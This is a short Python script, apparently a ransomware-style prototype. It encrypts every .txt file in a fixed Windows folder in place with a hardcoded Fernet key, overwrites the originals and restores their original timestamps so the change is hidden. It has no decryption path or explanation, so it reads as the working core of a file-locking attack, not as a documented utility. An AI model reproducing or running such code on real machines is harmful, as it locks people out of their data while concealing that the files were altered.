from cryptography.fernet import Fernet
from pathlib import Path
import os
import datetime

pasta = Path ('D:\Arquivos')
ext = ('.txt')

chave = 'H2eP02mu18qdHk-Fl3587-TL1OnZlsviNNMl4LMxHks='

def cripto():
    for arquivo in os.listdir(pasta):
        if arquivo.endswith(ext):
            caminho = pasta / arquivo

            data_m = os.path.getmtime(caminho)
            data_a = os.path.getatime(caminho)

            a = open(caminho,'rb')
            dados = a.read()
            a.close()

            k = Fernet(chave)
            dados_cripto = k.encrypt(dados)

            file = open(caminho, 'wb')
            file.write(dados_cripto)
            file.close()

            os.utime(caminho, (data_a, data_m))

cripto()